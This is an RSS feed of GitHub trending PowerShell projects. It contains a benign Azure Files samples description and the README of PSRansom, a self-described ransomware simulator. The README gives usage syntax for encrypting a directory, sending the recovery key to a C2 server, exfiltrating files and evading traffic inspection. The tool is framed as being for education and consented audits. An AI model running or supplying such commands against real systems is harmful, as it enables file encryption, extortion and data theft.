<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub PowerShell Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-08-27T01:43:28Z</updated>
  <subtitle>Daily Trending of PowerShell in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>Azure-Samples/azure-files-samples</title>
    <updated>2022-08-27T01:43:28Z</updated>
    <id>tag:github.com,2022-08-27:/Azure-Samples/azure-files-samples</id>
    <link href="https://github.com/Azure-Samples/azure-files-samples" rel="alternate"></link>
    <summary type="html">&lt;p&gt;This repository contains supporting code (PowerShell modules/scripts, ARM templates, etc.) for deploying, configuring, and using Azure Files.&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Azure Files&lt;/h2&gt; &#xA;&lt;p&gt;Azure Files provides serverless cloud file shares that can be used from anywhere in the world. You can mount Azure file shares directly from your on-premises workstation, or you can cache Azure file shares on an on-premises file server with Azure File Sync. To learn more about Azure Files, please see &lt;a href=&#34;https://docs.microsoft.com/azure/storage/files/storage-files-introduction&#34;&gt;Introduction to Azure Files&lt;/a&gt;, &lt;a href=&#34;https://docs.microsoft.com/azure/storage/files/storage-files-planning&#34;&gt;Planning for an Azure Files deployment&lt;/a&gt;, and &lt;a href=&#34;https://docs.microsoft.com/azure/storage/files/storage-sync-files-planning&#34;&gt;Planning for an Azure File Sync deployment&lt;/a&gt;. You can also reach out to us directly by sending us an email at &lt;a href=&#34;mailto:AzureFiles@microsoft.com&#34;&gt;&lt;/a&gt;&lt;a href=&#34;mailto:AzureFiles@microsoft.com&#34;&gt;AzureFiles@microsoft.com&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;About this repository&lt;/h3&gt; &#xA;&lt;p&gt;This repository contains supporting code (PowerShell modules/scripts, ARM templates, etc.) for deploying, configuring, and using Azure Files. This repository is home to the following important projects:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;The &lt;a href=&#34;https://raw.githubusercontent.com/Azure-Samples/azure-files-samples/master/AzFilesHybrid/readme.md&#34;&gt;AzFilesHybrid PowerShell module&lt;/a&gt;, which provides cmdlets for deploying and configuring Azure Files, namely, cmdlets for domain joining storage accounts to your on-premises Active Directory, and configuring your DNS servers.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;An Azure template for deploying &lt;a href=&#34;https://raw.githubusercontent.com/Azure-Samples/azure-files-samples/master/dns-forwarder/readme.md&#34;&gt;DNS forwarders&lt;/a&gt;, which provides an ARM template for deploying DNS forwarders. This template is used by the AzFilesHybrid module.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Instructions for setting up a Point-to-Site VPN (P2S) to bypass port 445. The most up-to-date instructions for configuring a Point-to-Site VPN are available &lt;a href=&#34;https://docs.microsoft.com/azure/storage/files/storage-files-configure-p2s-vpn-windows&#34;&gt;here&lt;/a&gt;, however, we have maintained this information in this repository for now since the P2S here use a slightly different approach some customers may find useful.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;How to contribute&lt;/h3&gt; &#xA;&lt;p&gt;We welcome issue submission and direct contributions. Please feel free to create pull requests or issues as needed.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>JoelGMSec/PSRansom</title>
    <updated>2022-08-27T01:43:28Z</updated>
    <id>tag:github.com,2022-08-27:/JoelGMSec/PSRansom</id>
    <link href="https://github.com/JoelGMSec/PSRansom" rel="alternate"></link>
    <summary type="html">&lt;p&gt;PowerShell Ransomware Simulator with C2 Server&lt;/p&gt;&lt;hr&gt;&lt;p align=&#34;center&#34;&gt;&lt;img width=&#34;750&#34; alt=&#34;PSRansom&#34; src=&#34;https://github.com/JoelGMSec/PSRansom/raw/main/PSRansom.png&#34;&gt;&lt;/p&gt; &#xA;&lt;h1&gt;PSRansom&lt;/h1&gt; &#xA;&lt;p&gt;&lt;strong&gt;PSRansom&lt;/strong&gt; is a PowerShell Ransomware Simulator with C2 Server capabilities. This tool helps you simulate encryption process of a generic ransomware in any system on any system with PowerShell installed on it. Thanks to the integrated C2 server, you can exfiltrate files and receive client information via HTTP.&lt;/p&gt; &#xA;&lt;p&gt;All communication between the two elements is encrypted or encoded so as to be undetected by traffic inspection mechanisms, although at no time is HTTPS used at any time.&lt;/p&gt; &#xA;&lt;h1&gt;Requirements&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;PowerShell 4.0 or greater&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;Download&lt;/h1&gt; &#xA;&lt;p&gt;It is recommended to clone the complete repository or download the zip file. You can do this by running the following command:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;git clone https://github.com/JoelGMSec/PSRansom&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h1&gt;Usage&lt;/h1&gt; &#xA;&lt;pre&gt;&lt;code&gt;.\PSRansom -h&#xA;&#xA;  ____  ____  ____&#xA; |  _ \/ ___||  _ \ __ _ _ __  ___  ___  _ __ ___&#xA; | |_) \___ \| |_) / _&#39; | &#39;_ \/ __|/ _ \| &#39;_ &#39; _ \&#xA; |  __/ ___) |  _ &amp;lt; (_| | | | \__ \ (_) | | | | | |&#xA; |_|   |____/|_| \_\__,_|_| |_|___/\___/|_| |_| |_|&#xA;&#xA;  ----------------- by @JoelGMSec ----------------&#xA;&#xA; Info:  This tool helps you simulate encryption process of a&#xA;        generic ransomware in PowerShell with C2 capabilities&#xA;&#xA; Usage: .\PSRansom.ps1 -e Directory -s C2Server -p C2Port&#xA;          Encrypt all files &amp;amp; sends recovery key to C2Server&#xA;          Use -x to exfiltrate and decrypt files on C2Server&#xA;&#xA;        .\PSRansom.ps1 -d Directory -k RecoveryKey&#xA;          Decrypt all files with recovery key string&#xA;&#xA; Warning: All info will be sent to the C2Server without any encryption&#xA;          You need previously generated recovery key to retrieve files&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;The detailed guide of use can be found at the following link:&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://darkbyte.net/psransom-simulando-un-ransomware-generico-con-powershell&#34;&gt;https://darkbyte.net/psransom-simulando-un-ransomware-generico-con-powershell&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;License&lt;/h1&gt; &#xA;&lt;p&gt;This project is licensed under the GNU 3.0 license - see the LICENSE file for more details.&lt;/p&gt; &#xA;&lt;h1&gt;Credits and Acknowledgments&lt;/h1&gt; &#xA;&lt;p&gt;This tool has been created and designed from scratch by Joel Gámez Molina // @JoelGMSec&lt;/p&gt; &#xA;&lt;h1&gt;Contact&lt;/h1&gt; &#xA;&lt;p&gt;This software does not offer any kind of guarantee. Its use is exclusive for educational environments and / or security audits with the corresponding consent of the client. I am not responsible for its misuse or for any possible damage caused by it.&lt;/p&gt; &#xA;&lt;p&gt;For more information, you can find me on Twitter as &lt;a href=&#34;https://twitter.com/JoelGMSec&#34;&gt;@JoelGMSec&lt;/a&gt; and on my blog &lt;a href=&#34;https://darkbyte.net&#34;&gt;darkbyte.net&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h1&gt;Support&lt;/h1&gt; &#xA;&lt;p&gt;You can support my work buying me a coffee:&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.buymeacoffee.com/joelgmsec&#34;&gt;&lt;img width=&#34;250&#34; alt=&#34;buymeacoffe&#34; src=&#34;https://cdn.buymeacoffee.com/buttons/v2/default-blue.png&#34;&gt;&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
</feed>